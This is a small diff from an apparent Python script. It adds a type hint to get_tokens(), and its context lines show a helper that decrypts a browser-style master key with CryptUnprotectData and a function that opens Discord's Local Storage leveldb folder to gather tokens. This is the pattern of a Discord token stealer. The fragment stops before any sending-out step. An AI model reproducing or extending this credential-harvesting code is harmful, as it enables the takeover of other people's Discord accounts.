@@ -21,7 +21,7 @@ def _get_master_key(path: str):
 
         return CryptUnprotectData(master_key, None, None, None, 0)[1]
 
-def get_tokens(debug = False):
+def get_tokens(debug: bool = False):
     path = str(os.getenv("appdata")) + "/discord/Local Storage/leveldb"
     tokens: list[str] = []
 
